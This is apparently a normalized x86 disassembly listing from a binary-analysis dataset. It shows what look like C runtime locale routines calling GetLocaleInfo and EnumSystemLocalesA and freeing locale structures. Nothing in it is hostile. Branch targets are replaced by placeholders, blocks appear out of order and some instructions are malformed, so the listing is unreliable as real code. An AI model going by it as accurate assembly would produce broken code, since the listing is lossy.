call sub_4381f8
push [ esi + 0xa8 ]
call sub_4381f8
push [ esi + 0xbc ]
call sub_4381f8
push [ esi + 0xc0 ]
call sub_4381f8
push [ esi + 0xc4 ]
call sub_4381f8
push [ esi + 0xc8 ]
call sub_4381f8
push [ esi + 0xcc ]
call sub_4381f8
add esp 0x40
push [ esi + 0xd0 ]
call sub_4381f8
push [ esi + 0xb8 ]
call sub_4381f8
push [ esi + 0xd8 ]
call sub_4381f8
push [ esi + 0xdc ]
call sub_4381f8
push [ esi + 0xe0 ]
call sub_4381f8
push [ esi + 0xe4 ]
call sub_4381f8
push [ esi + 0xe8 ]
call sub_4381f8
push [ esi + 0xec ]
call sub_4381f8
push [ esi + 0xd4 ]
call sub_4381f8
push [ esi + 0xf0 ]
call sub_4381f8
push [ esi + 0xf4 ]
call sub_4381f8
push [ esi + 0xf8 ]
call sub_4381f8
push [ esi + 0xfc ]
call sub_4381f8
push [ esi + 0x100 ]
call sub_4381f8
push [ esi + 0x104 ]
call sub_4381f8
push [ esi + 0x108 ]
call sub_4381f8
add esp 0x40
push [ esi + 0x10c ]
call sub_4381f8
push [ esi + 0x110 ]
call sub_4381f8
push [ esi + 0x114 ]
call sub_4381f8
push [ esi + 0x118 ]
call sub_4381f8
push [ esi + 0x11c ]
call sub_4381f8
push [ esi + 0x120 ]
call sub_4381f8
push [ esi + 0x124 ]
call sub_4381f8
push [ esi + 0x128 ]
call sub_4381f8
push [ esi + 0x12c ]
call sub_4381f8
push [ esi + 0x130 ]
call sub_4381f8
push [ esi + 0x134 ]
call sub_4381f8
push [ esi + 0x138 ]
call sub_4381f8
push [ esi + 0x13c ]
call sub_4381f8
push [ esi + 0x140 ]
call sub_4381f8
push [ esi + 0x144 ]
call sub_4381f8
push [ esi + 0x148 ]
call sub_4381f8
add esp 0x40
push [ esi + 0x14c ]
call sub_4381f8
push [ esi + 0x150 ]
call sub_4381f8
push [ esi + 0x154 ]
call sub_4381f8
push [ esi + 0x158 ]
call sub_4381f8
push [ esi + 0x15c ]
call sub_4381f8
push [ esi + 0x160 ]
call sub_4381f8
add esp 0x18
sub_443be0
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x20 ] 0x0
push edi
mov ebx rw-data
je r-xdata
mov edi ebx
push 0x164
push 0x1
call sub_43de17
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
mov [ esi + 0xd4 ] edi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax esi
mov ecx edi
call sub_44306a
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ edi + 0xb4 ] 0x1
jmp r-xdata
push edi
call sub_443869
push edi
call sub_4381f8
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xd4 ]
cmp eax ebx
je r-xdata
sub_443c5d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4381f8
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_4381f8
pop ecx
push esi
call sub_4381f8
pop ecx
sub_443cc6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x50
push 0x1
call sub_43de17
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x18 ] edi
jne r-xdata
mov esi [ esi + 0xbc ]
push 0x14
pop ecx
mov edi ebx
push 0x4
[ edi ] [ esi ]
call sub_43ddd2
xor edi edi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov [ eax ] edi
cmp [ esi + 0x1c ] edi
je r-xdata
push ebx
call sub_4381f8
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb4 ]
mov edi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ ebx ] eax
mov eax [ rw-data ]
mov [ ebx + 0x4 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x8 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x30 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] edi
mov [ ebx + 0x34 ] eax
push 0x4
call sub_43ddd2
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
push eax
call edi
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x3e ]
push ebx
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_44a386
mov edi eax
lea eax [ ebx + 0x4 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ ebx + 0x8 ]
push eax
push 0x10
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ ebx + 0x30 ]
push eax
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ ebx + 0x34 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_44a386
add esp 0x14
or eax edi
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push ebx
call sub_443c5d
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ esi + 0xb0 ]
call sub_4381f8
push [ esi + 0xbc ]
call sub_4381f8
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push ebx
call sub_4381f8
push [ ebp - 0x8 ]
call sub_4381f8
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ecx ] eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_443eb6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4381f8
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4381f8
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_4381f8
pop ecx
push esi
call sub_4381f8
pop ecx
sub_443fb4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x50
push 0x1
call sub_43de17
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_43ddd2
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_4381f8
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0x14
pop ecx
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_43ddd2
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_44a386
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_44a386
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_44a386
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_44a386
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_44a386
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_44a386
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_44a386
or edi eax
lea eax [ ebx + 0x38 ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ ebx + 0x3c ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ ebx + 0x40 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ ebx + 0x44 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ ebx + 0x48 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ ebx + 0x4c ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_44a386
add esp 0x14
or eax edi
je r-xdata
push ebx
call sub_4381f8
push [ ebp - 0x8 ]
call sub_4381f8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_443eb6
push ebx
call sub_4381f8
push [ ebp - 0x8 ]
call sub_4381f8
push [ ebp - 0x4 ]
call sub_4381f8
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_4381f8
push [ esi + 0xb0 ]
call sub_4381f8
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xbc ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ ebx + 0x4 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x30 ]
mov [ ebx + 0x30 ] ecx
mov eax [ eax + 0xbc ]
mov eax [ eax + 0x34 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x34 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_444317
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
test ecx ecx
je r-xdata
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi ecx
mov [ ecx ] 0x0
jmp r-xdata
test edi edi
je r-xdata
inc esi
dec edi
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] 0x0
call sub_43c04c
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ edx ]
mov [ esi + edx ] al
inc edx
test al al
je r-xdata
call sub_43f8c5
mov eax esi
jmp r-xdata
sub_444384
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ eax ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov ecx eax
jne r-xdata
mov [ eax ] bl
jmp r-xdata
mov esi edx
sub esi eax
mov esi eax
sub esi edx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ ecx ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
mov cl [ edx ]
mov [ esi + edx ] cl
inc edx
cmp cl bl
je r-xdata
jmp r-xdata
mov dl [ esi + ecx ]
mov [ ecx ] dl
inc ecx
cmp dl bl
je r-xdata
mov [ eax ] bl
call sub_43c04c
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ eax + ecx - 0x1 ] bl
pop eax
jmp r-xdata
call sub_43f8c5
mov eax esi
jmp r-xdata
sub_444439
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_44cf0e
pop ecx
pop ecx
test eax eax
jne r-xdata
jns r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_44449b
mov edi edi
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x20001004
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
leave
retn
push r--data
push esi
call sub_43b970
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
call [ GetACP@IAT ]
leave
retn
push r--data
push esi
call sub_43b970
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_44cf55
pop ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x2000000b
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
sub_44451f
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
add eax 0x2
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_444544
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
lea eax [ ecx - 0x61 ]
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
lea eax [ ecx - 0x41 ]
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
add esi esi
lea esi [ eax + esi * 8 - 0x30 ]
add cl 0xf9
sub_444575
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_444590
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_43ffe0
mov edx edi
mov esi eax
call sub_444544
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0xb0 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0xa0 ]
call sub_44cf0e
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0xa4 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0xa4 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_44451f
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_437c1c
leave
retn 0x4
or [ esi + 0xa4 ] 0x4
mov [ esi + 0xb8 ] edi
mov [ esi + 0xb4 ] edi
sub_444637
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax esi
and eax 0x3ff
push 0x20000001
or eax 0x400
push eax
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop esi
leave
retn
mov eax [ ebp + 0xc ]
mov esi [ eax ]
push edi
mov edx esi
call sub_444575
push esi
mov edi eax
call sub_43c860
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_444692
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_43ffe0
mov edx edi
lea esi [ eax + 0x9c ]
call sub_444544
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_44cf0e
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_44cf0e
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_44cf0e
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_44d04d
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_44cf0e
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_43c860
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_44451f
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_43c860
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push esi
push ebx
mov [ esi + 0x18 ] edi
push esi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
mov eax edi
call sub_444637
pop ecx
pop ecx
test eax eax
je r-xdata
sub_444863
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_43ffe0
mov edx edi
lea esi [ eax + 0x9c ]
call sub_444544
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_44cf0e
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_437c1c
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push esi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_44cf0e
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax edi
call sub_444637
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
push eax
sub_444923
push [ esi ]
call sub_43c860
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_43c860
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_444575
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_444692
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_44498a
push [ esi ]
call sub_43c860
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_444575
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_444863
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_4449c6
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_43ffe0
lea edi [ eax + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov [ edi ] eax
add eax 0x40
lea ebx [ edi + 0x4 ]
mov [ ebx ] eax
je r-xdata
or [ edi + 0x8 ] 0x104
jmp r-xdata
mov eax [ edi ]
and [ edi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push ebx
push 0x16
push r--data
call sub_444439
add esp 0xc
xor eax eax
mov esi [ ebp + 0x8 ]
mov eax esi
sub eax 0xffffff80
neg esi
sbb esi esi
and esi eax
call sub_44449b
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
je r-xdata
mov [ edi + 0x8 ] 0x104
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
cmp esi 0xfde8
je r-xdata
push ebx
call sub_43c860
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_444590
mov [ edi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ edi + 0x8 ] 0x4
jne r-xdata
mov esi edi
call sub_44498a
cmp [ eax ] 0x0
je r-xdata
cmp esi 0xfde9
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
and [ edi + 0x8 ] 0x0
